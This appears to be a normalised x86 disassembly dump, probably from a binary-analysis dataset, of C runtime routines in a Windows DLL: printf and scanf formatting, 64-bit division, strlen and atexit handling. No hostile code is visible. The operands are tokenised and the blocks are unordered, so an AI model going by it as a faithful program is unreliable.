cmp [ ebp - 0x40c ] 0xa3
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x41c ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
cmp [ ebp - 0x44c ] 0x0
jmp r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] 0x8
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x42c ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x438 ] al
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
mov [ ebp - 0x437 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_10011ff9
add esp 0x10
test eax eax
jns r-xdata
and [ ebp - 0x460 ] 0x0
add eax 0x2
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] ebx
jl r-xdata
inc esi
push [ ebp - 0x414 ]
mov edi [ ebp - 0x464 ]
push [ ebp - 0x410 ]
mov ebx [ ebp - 0x424 ]
lea eax [ ebp - 0x418 ]
call sub_1000bfae
pop ecx
pop ecx
mov ebx [ ebp - 0x414 ]
test ebx ebx
jle r-xdata
mov edi [ ebp - 0x41c ]
jmp r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_1000bf7f
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
push 0x20
mov esi [ ebp - 0x40c ]
add esi 0x15d
push esi
call sub_1000f158
pop ecx
mov [ ebp - 0x43c ] eax
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x458 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x418 ]
mov [ esi ] eax
mov ax [ ebp - 0x418 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x428 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x448 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
test edi edi
jg r-xdata
mov [ ebp - 0x40c ] 0xa3
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc ebx
mov [ ebp - 0x410 ] ebx
lea eax [ ebp - 0x458 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x448 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ebx
call sub_10011c30
add ecx 0x30
mov [ ebp - 0x474 ] ebx
mov ebx eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
mov edi [ ebp - 0x41c ]
jmp r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x45c ]
mov eax [ ebp - 0x424 ]
lea esi [ ebp - 0x418 ]
call sub_1000bf7f
add edi [ ebp - 0x474 ]
pop ecx
test ebx ebx
jg r-xdata
push 0x30
lea esi [ ebp - 0x418 ]
mov eax ebx
dec edi
call sub_1000bf7f
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
call sub_1000cdc0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x444 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x418 ] 0x0
jl r-xdata
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x45c ]
push edi
push eax
dec ebx
call sub_10011ff9
add esp 0x10
mov [ ebp - 0x474 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_1000bf7f
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
dec [ ebp - 0x410 ]
mov eax [ ebp - 0x410 ]
inc [ ebp - 0x414 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax esi
cmp [ eax ] 0x30
je r-xdata
sub_1000cbe0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_1000cc48
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_10012129
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1000f1e9
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1000f1e9
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_1000ccfe
mov edi edi
push esi
push 0x4
push 0x20
call sub_1000f19d
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_1000cd2f
push 0xc
push r--data
call sub_1000f940
call sub_1000ebc2
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_1000cc48
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000cd65
mov eax [ ebp - 0x1c ]
call sub_1000f985
retn
sub_1000cd91
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1000cdc0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_1000ce4b
mov edi edi
push ebp
mov ebp esp
mov eax [ esi ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ edi ]
push 0x2
push eax
cmp ecx [ ebp + 0xc ]
jne r-xdata
push ecx
call sub_1000f237
add esp 0xc
test eax eax
je r-xdata
call sub_1000f19d
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
push [ esi ]
push [ ebp + 0xc ]
push [ edi ]
call sub_10010170
add esp 0xc
jmp r-xdata
shl [ esi ] 0x1
sub_1000cea2
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_100096e9
test eax eax
movsx eax [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop ebp
retn
and eax 0xffffffdf
sub eax 0x7
sub_1000ced8
mov edi edi
push ebp
mov ebp esp
push ebx
mov eax ebx
pop ebx
pop ebp
retn
movzx eax bl
push eax
call sub_100097ee
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
inc [ esi ]
call sub_1000cec2
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub_1000cf02
mov edi edi
push ebp
mov ebp esp
sub esp 0x200
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x1e8 ] ecx
lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x1a4 ] eax
mov [ ebp - 0x1b0 ] ecx
mov [ ebp - 0x1dc ] 0x15e
mov [ ebp - 0x1d0 ] edi
mov [ ebp - 0x1ec ] edi
mov [ ebp - 0x194 ] edi
cmp esi edi
jne r-xdata
cmp eax edi
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
push ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10008d64
leave
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x1fc ]
call sub_10009611
mov al [ esi ]
mov [ ebp - 0x1a5 ] 0x0
mov [ ebp - 0x18c ] edi
mov [ ebp - 0x1cc ] edi
test al al
je r-xdata
push eax
call sub_10010d42
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x1f0 ] 0x0
je r-xdata
mov edi esi
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0x1cc ]
mov eax [ ebp - 0x1f4 ]
and [ eax + 0x70 ] 0xfffffffd
mov al [ edi ]
cmp al 0x25
jne r-xdata
push [ ebp - 0x1a4 ]
dec [ ebp - 0x18c ]
lea esi [ ebp - 0x18c ]
call sub_1000ced8
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
mov ebx eax
movzx eax [ edi ]
inc edi
mov [ ebp - 0x194 ] ebx
mov [ ebp - 0x1bc ] edi
cmp eax ebx
jne r-xdata
cmp [ edi + 0x1 ] al
je r-xdata
inc edi
movzx eax [ edi ]
push eax
call sub_100097ee
pop ecx
test eax eax
jne r-xdata
push [ ebp - 0x1a4 ]
push eax
call sub_1001227e
pop ecx
pop ecx
pop ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp ebx 0xffffffff
movzx eax bl
push eax
call sub_10010142
pop ecx
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
xor eax eax
mov [ ebp - 0x1e4 ] eax
mov [ ebp - 0x1d1 ] al
mov [ ebp - 0x1ac ] eax
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x19c ] eax
mov [ ebp - 0x1a8 ] al
mov [ ebp - 0x1a7 ] al
mov [ ebp - 0x19d ] al
mov [ ebp - 0x18d ] al
mov [ ebp - 0x1a6 ] al
mov [ ebp - 0x195 ] al
mov [ ebp - 0x185 ] 0x1
mov [ ebp - 0x1d8 ] eax
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x1d0 ] 0x1
jne r-xdata
push [ ebp - 0x1a4 ]
push [ ebp - 0x194 ]
call sub_1001227e
pop ecx
pop ecx
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
movzx ecx [ edi ]
inc edi
mov [ ebp - 0x1bc ] edi
cmp ecx eax
jne r-xdata
cmp [ edi + 0x1 ] al
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0x19c ]
inc [ ebp - 0x1b8 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x19c ] eax
jmp r-xdata
mov al [ edi ]
test al al
jne r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
push [ ebp - 0x1b0 ]
call sub_10009957
pop ecx
cmp [ edi ] 0x25
jne r-xdata
cmp eax 0xffffffff
je r-xdata
dec [ ebp - 0x18c ]
inc edi
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x18d ] 0x0
je r-xdata
movzx eax al
push eax
call sub_100097ee
pop ecx
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x1cc ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1bc ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
push [ ebp - 0x1a4 ]
push eax
call sub_1001227e
pop ecx
pop ecx
dec [ ebp - 0x185 ]
dec [ ebp - 0x195 ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc edi
movzx ebx [ edi ]
movzx eax bl
push eax
call sub_100096e9
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x19d ] 0x0
mov [ ebp - 0x1bc ] edi
jne r-xdata
cmp [ ebp - 0x1f0 ] 0x0
je r-xdata
cmp [ ebp - 0x1a5 ] al
jne r-xdata
mov edi eax
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x19d ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
xor esi esi
mov eax [ ebp - 0x1e8 ]
mov esi [ eax ]
mov [ ebp - 0x200 ] eax
add eax 0x4
mov [ ebp - 0x1e8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x1f4 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
inc [ ebp - 0x1d8 ]
mov edi eax
mov [ ebp - 0x1c8 ] esi
mov [ ebp - 0x1c4 ] esi
jmp r-xdata
inc [ ebp - 0x185 ]
inc [ ebp - 0x195 ]
jmp r-xdata
inc [ ebp - 0x18d ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx ebx [ edi ]
or ebx 0x20
mov [ ebp - 0x1b4 ] ebx
cmp ebx 0x6e
je r-xdata
mov al [ edi ]
cmp al 0x53
je r-xdata
cmp [ ebp - 0x195 ] 0x0
mov [ ebp - 0x1c0 ] esi
mov [ ebp - 0x18d ] 0x0
jne r-xdata
mov cl [ edi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x1b8 ]
test ecx ecx
je r-xdata
cmp ebx 0x63
je r-xdata
mov [ ebp - 0x195 ] 0x1
mov [ ebp - 0x195 ] 0xff
cmp al 0x43
jne r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x185 ]
jmp r-xdata
cmp ebx 0x6f
jg r-xdata
cmp [ ebp - 0x19c ] 0x0
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
cmp ebx 0x7b
je r-xdata
cmp cl 0x64
je r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
mov eax ebx
sub eax 0x70
je r-xdata
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jmp r-xdata
mov esi [ ebp - 0x1c0 ]
mov edi [ ebp - 0x1bc ]
push [ ebp - 0x1a4 ]
lea esi [ ebp - 0x18c ]
call sub_1000ced8
pop ecx
jmp r-xdata
cmp cl 0x69
je r-xdata
mov edi eax
jmp r-xdata
mov [ ebp - 0x185 ] 0x1
sub eax 0x3
je r-xdata
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
cmp ebx 0x63
je r-xdata
je r-xdata
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
cmp cl 0x6f
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a7 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
push 0x64
pop eax
cmp ebx eax
je r-xdata
cmp cl 0x78
je r-xdata
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
mov edi esi
je r-xdata
mov [ ebp - 0x1a6 ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x19c ]
mov [ ebp - 0x1b8 ] 0x1
jle r-xdata
cmp cl 0x58
jne r-xdata
cmp [ ebp - 0x18d ] 0x0
mov edi [ ebp - 0x1e4 ]
jne r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
mov ebx eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1b8 ] 0x0
je r-xdata
push [ ebp - 0x1a4 ]
push [ ebp - 0x194 ]
call sub_1001227e
pop ecx
pop ecx
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ edi ]
cmp eax [ ebp - 0x194 ]
jne r-xdata
cmp ebx 0x67
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x1a7 ] 0x0
je r-xdata
cmp [ ebp - 0x1b4 ] 0x78
je r-xdata
cmp [ ebp - 0x1a7 ] 0x0
mov edi [ ebp - 0x1e4 ]
je r-xdata
cmp [ ebp - 0x1b4 ] 0x78
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a7 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
dec [ ebp - 0x1a5 ]
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x194 ] 0x2d
jne r-xdata
cmp ebx 0x69
je r-xdata
cmp [ ebp - 0x1b4 ] 0x46
jne r-xdata
neg edi
movzx eax bl
push eax
call sub_1000976d
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1b4 ] 0x70
je r-xdata
mov eax [ ebp - 0x1c8 ]
mov ecx [ ebp - 0x1c4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x1c8 ] eax
mov [ ebp - 0x1c4 ] ecx
jmp r-xdata
movzx eax bl
push eax
call sub_1000976d
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1b4 ] 0x70
je r-xdata
dec [ ebp - 0x18c ]
cmp eax 0xffffffff
je r-xdata
cmp ebx 0x63
je r-xdata
cmp edi esi
je r-xdata
cmp ebx 0x30
jne r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
cmp [ edi + 0x1 ] 0x5e
lea esi [ edi + 0x1 ]
jne r-xdata
mov [ ebp - 0x1a6 ] 0x1
mov edi [ ebp - 0x1bc ]
inc [ ebp - 0x1a5 ]
inc edi
mov [ ebp - 0x1bc ] edi
jmp r-xdata
mov eax [ ebp - 0x200 ]
mov [ ebp - 0x1e8 ] eax
jmp r-xdata
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1b0 ]
mov [ eax ] 0x2d
inc ebx
jmp r-xdata
mov [ ebp - 0x1b4 ] eax
cmp ebx 0x6e
jne r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
and [ ebp - 0x1ac ] 0x0
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
push ebx
shl edi 0x4
call sub_1000cea2
mov ebx eax
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_100096e9
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
mov esi [ ebp - 0x1c8 ]
mov edi [ ebp - 0x1c4 ]
shld edi esi 0x4
push ebx
shl esi 0x4
call sub_1000cea2
mov ebx eax
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_100096e9
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x1a4 ]
push eax
call sub_1001227e
pop ecx
pop ecx
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
cmp ebx 0x73
jne r-xdata
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
mov ebx eax
mov [ ebp - 0x194 ] ebx
cmp bl 0x78
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
mov ebx eax
mov [ ebp - 0x194 ] ebx
test ecx ecx
je r-xdata
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_1000ffa0
add esp 0xc
cmp [ esi ] 0x5d
jne r-xdata
lea esi [ edi + 0x2 ]
mov [ ebp - 0x1a8 ] 0xff
cmp [ ebp - 0x1b8 ] 0x0
jne r-xdata
dec [ ebp - 0x19c ]
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
mov [ ebp - 0x194 ] eax
cmp [ ebp - 0x19d ] 0x0
mov edi [ ebp - 0x18c ]
je r-xdata
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
push [ ebp - 0x1a4 ]
push ebx
call sub_1001227e
pop ecx
pop ecx
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp [ ebp - 0x1b4 ] 0x6f
jne r-xdata
push [ ebp - 0x1a4 ]
push ebx
call sub_1001227e
pop ecx
pop ecx
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp [ ebp - 0x1b4 ] 0x6f
jne r-xdata
inc edi
jmp r-xdata
cmp [ ebp - 0x1a6 ] 0x0
je r-xdata
cmp ebx 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
inc [ ebp - 0x1cc ]
cmp ebx 0x63
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
cmp [ ebp - 0x1b8 ] 0x0
mov ebx eax
mov [ ebp - 0x194 ] ebx
je r-xdata
cmp bl 0x58
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
mov dl [ ebp - 0x1d1 ]
jmp r-xdata
mov dl 0x5d
inc esi
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
or [ ebp - 0x19c ] 0xffffffff
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x1cc ]
mov esi [ ebp - 0x1c0 ]
imul edi edi 0xa
jmp r-xdata
cmp ebx 0x38
jge r-xdata
push 0x0
push 0xa
push [ ebp - 0x1c4 ]
push [ ebp - 0x1c8 ]
call sub_10010020
mov esi eax
mov edi edx
jmp r-xdata
cmp ebx 0x38
jge r-xdata
mov [ esi ] al
inc esi
mov [ ebp - 0x1e0 ] al
movzx eax al
push eax
call sub_10010142
pop ecx
test eax eax
je r-xdata
movsx ebx [ ebp - 0x1a8 ]
xor edx edx
mov ecx eax
and ecx 0x7
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x24 ]
xor ecx ebx
mov ebx [ ebp - 0x1b4 ]
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
cmp [ ebp - 0x1a6 ] 0x0
je r-xdata
mov [ ebp - 0x1b4 ] 0x78
jmp r-xdata
sub [ ebp - 0x19c ] 0x2
cmp [ ebp - 0x19c ] 0x1
jge r-xdata
cmp [ ebp - 0x1b4 ] 0x78
mov [ ebp - 0x1ac ] 0x1
je r-xdata
mov al [ esi ]
cmp al 0x5d
jne r-xdata
push eax
call sub_100096e9
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x185 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c8 ]
mov [ esi ] eax
mov eax [ ebp - 0x1c4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
inc [ ebp - 0x1ac ]
cmp [ ebp - 0x1b8 ] 0x0
lea edi [ edi + ebx - 0x30 ]
je r-xdata
shl edi 0x3
jmp r-xdata
inc [ ebp - 0x1ac ]
lea eax [ ebx - 0x30 ]
cdq
add esi eax
adc edi edx
cmp [ ebp - 0x1b8 ] 0x0
mov [ ebp - 0x1c8 ] esi
mov [ ebp - 0x1c4 ] edi
je r-xdata
mov esi [ ebp - 0x1c8 ]
mov edi [ ebp - 0x1c4 ]
shld edi esi 0x3
shl esi 0x3
jmp r-xdata
lea eax [ ebp - 0x1fc ]
push eax
mov eax [ ebp - 0x1fc ]
mov [ ebp - 0x1ec ] 0x3f
push [ eax + 0xac ]
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x1ec ]
push eax
call sub_10011ff9
mov ax [ ebp - 0x1ec ]
add esp 0x10
mov [ esi ] ax
add esi 0x2
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_1000cec2
mov [ ebp - 0x1df ] al
mov eax [ ebp - 0x1c0 ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1c0 ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
inc [ ebp - 0x18d ]
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x1b8 ] 0x0
je r-xdata
inc esi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1fc ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ ebp - 0x1a8 ] al
cmp al [ ebp - 0x194 ]
jne r-xdata
mov [ esi ] di
mov [ esi ] edi
jmp r-xdata
mov [ ebp - 0x1c0 ] esi
jmp r-xdata
push 0x30
pop ebx
jmp r-xdata
push [ ebp - 0x1a4 ]
push ebx
call sub_1001227e
pop ecx
pop ecx
mov [ ebp - 0x1b4 ] 0x6f
jmp r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
mov ebx [ ebp - 0x1b4 ]
test dl dl
je r-xdata
mov [ ebp - 0x1bc ] esi
mov esi [ ebp - 0x1c0 ]
jmp r-xdata
